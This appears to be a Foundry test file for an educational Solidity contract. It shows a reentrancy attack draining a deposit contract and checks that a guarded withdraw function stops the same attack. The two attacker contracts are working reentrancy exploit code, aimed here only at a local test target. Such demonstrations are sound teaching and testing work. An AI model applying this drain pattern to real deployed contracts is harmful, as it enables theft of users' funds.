// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentrancyTrial} from "../src/ReentrancyTrial.sol";

contract ReentrancyTrialTest is Test {
    address player1 = makeAddr("player1");
    ReentrancyTrial victimContract;
    address attackUser = makeAddr("attackUser");

    function setUp() external {
        victimContract = new ReentrancyTrial();
        vm.deal(player1, 10 ether);
        vm.deal(attackUser, 2 ether);

        vm.prank(player1);
        victimContract.deposit{value: 10 ether}();
    }

    function testAttackWithoutGuard() external {
        vm.prank(attackUser);
        AttackerContract attacker = new AttackerContract{value: 1 ether}(
            address(victimContract)
        );
        uint256 startingBalance = address(attacker).balance;

        attacker.attack();

        uint256 endingBalance = address(attacker).balance;

        assertEq(startingBalance, 1 ether);
        assertEq(endingBalance, 11 ether);
    }

    function testAttackWithGuard() external {
        vm.prank(attackUser);
        AttackerGuardedContract attacker = new AttackerGuardedContract{
            value: 1 ether
        }(address(victimContract));

        vm.expectRevert();
        attacker.attack();
    }
}

contract AttackerContract {
    ReentrancyTrial victim;
    uint256 amount;
    constructor(address victimAddress) payable {
        victim = ReentrancyTrial(victimAddress);
        amount = msg.value;
    }

    function attack() external {
        victim.deposit{value: amount}();
        victim.withdraw();
    }

    receive() external payable {
        if (payable(address(victim)).balance != 0) {
            victim.withdraw();
        }
    }
}

contract AttackerGuardedContract {
    ReentrancyTrial victim;
    uint256 amount;
    constructor(address victimAddress) payable {
        victim = ReentrancyTrial(victimAddress);
        amount = msg.value;
    }

    function attack() external {
        victim.deposit{value: amount}();
        victim.withdrawWithGuard();
    }

    receive() external payable {
        if (payable(address(victim)).balance != 0) {
            victim.withdrawWithGuard();
        }
    }
}
